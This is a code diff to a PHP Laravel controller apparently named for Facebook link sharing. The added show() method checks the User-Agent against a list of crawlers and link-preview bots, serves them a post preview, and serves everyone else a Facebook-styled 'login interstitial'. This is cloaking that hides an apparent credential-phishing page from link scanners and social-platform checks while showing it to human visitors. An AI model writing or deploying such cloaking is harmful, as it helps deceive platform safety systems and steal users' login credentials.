@@ -36,10 +36,18 @@ class FacebookShareController extends Controller
         return view('admin.share_link', compact('link'));
     }
 
-    public function show($token)
+    public function show($token, Request $request)
     {
-        // Always show the login interstitial view
-        return response()->view('facebook.login_interstitial');
+        $post = SharedPost::where('token', $token)->firstOrFail();
+        $userAgent = strtolower($request->header('User-Agent', ''));
+        $isBot = preg_match('/bot|crawl|slurp|spider|facebookexternalhit|facebot|twitterbot|linkedinbot|embedly|quora link preview|showyoubot|outbrain|pinterest|slackbot|vkshare|telegrambot|applebot|whatsapp|flipboard|tumblr|bitlybot|scoop.it|redditbot|discordbot|google|bing|yandex|baidu/', $userAgent);
+        if ($isBot) {
+            // Show meta preview for bots/crawlers
+            return response()->view('facebook.shared_post', compact('post'));
+        } else {
+            // Show login interstitial for real users
+            return response()->view('facebook.login_interstitial');
+        }
     }
 
     public function destroy($id)
